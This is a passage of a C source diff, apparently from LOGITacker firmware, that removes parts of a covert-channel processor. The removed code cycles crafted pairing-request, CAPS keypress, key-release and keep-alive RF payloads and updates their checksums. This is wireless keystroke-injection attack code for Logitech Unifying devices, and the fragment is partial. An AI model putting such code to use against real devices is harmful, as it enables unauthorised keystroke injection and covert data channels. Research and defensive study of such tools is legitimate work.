-            {
-                NRF_LOG_DEBUG("Update payload to PAIRING REQUEST");
-                uint8_t len = sizeof(rf_report_pairing_request1);
-                memcpy(self->tmp_tx_payload.data, rf_report_pairing_request1, len);
-                self->tmp_tx_payload.length = len;
-                break;
-            }
-            default:
-                NRF_LOG_DEBUG("Update payload to KEEP ALIVE");
-                memcpy(self->tmp_tx_payload.data, rf_report_keep_alive, sizeof(rf_report_keep_alive));
-                self->tmp_tx_payload.length = sizeof(rf_report_keep_alive);
-                break;
-        }
-
-
-    } else {
-        // sequence: CAPS, Keep-Alive, Key release, keep-alive
-        switch (iter_mod_4) {
-            case 0:
-            {
-                NRF_LOG_DEBUG("Update payload to PLAIN KEY CAPS");
-                memcpy(self->tmp_tx_payload.data, rf_report_plain_keys_caps, sizeof(rf_report_plain_keys_caps));
-                self->tmp_tx_payload.length = sizeof(rf_report_plain_keys_caps);
-                break;
-            }
-            case 2:
-            {
-                NRF_LOG_DEBUG("Update payload to PLAIN KEY RELEASE");
-                memcpy(self->tmp_tx_payload.data, rf_report_plain_keys_release, sizeof(rf_report_plain_keys_release));
-                self->tmp_tx_payload.length = sizeof(rf_report_plain_keys_release);
-                break;
-            }
-            default:
-                NRF_LOG_DEBUG("Update payload to KEEP ALIVE");
-                memcpy(self->tmp_tx_payload.data, rf_report_keep_alive, sizeof(rf_report_keep_alive));
-                self->tmp_tx_payload.length = sizeof(rf_report_keep_alive);
-                break;
-        }
-    }
-
-    self->tmp_tx_payload.pipe = 1;
-    self->tmp_tx_payload.noack = false; // we need an ack
-
-}
 
 logitacker_processor_t * new_processor_covert_channel(uint8_t *rf_address, app_timer_id_t timer_next_action) {
-    //update checksums of RF payloads (only needed as they are not hardcoded, to allow changing payloads)
-    logitacker_unifying_payload_update_checksum(rf_report_plain_keys_caps, sizeof(rf_report_plain_keys_caps));
-    logitacker_unifying_payload_update_checksum(rf_report_plain_keys_release, sizeof(rf_report_plain_keys_release));
-    rf_report_pairing_request1[0] = PAIRING_REQ_MARKER_BYTE;
-    logitacker_unifying_payload_update_checksum(rf_report_pairing_request1, sizeof(rf_report_pairing_request1));
-    logitacker_unifying_payload_update_checksum(rf_report_keep_alive, sizeof(rf_report_keep_alive));
-
-
     // initialize context (static in this case, has to use malloc for new instances)
     logitacker_processor_covert_channel_ctx_t *const p_ctx = &m_static_covert_channel_ctx;
     memset(p_ctx, 0, sizeof(*p_ctx)); //replace with malloc for dedicated instance
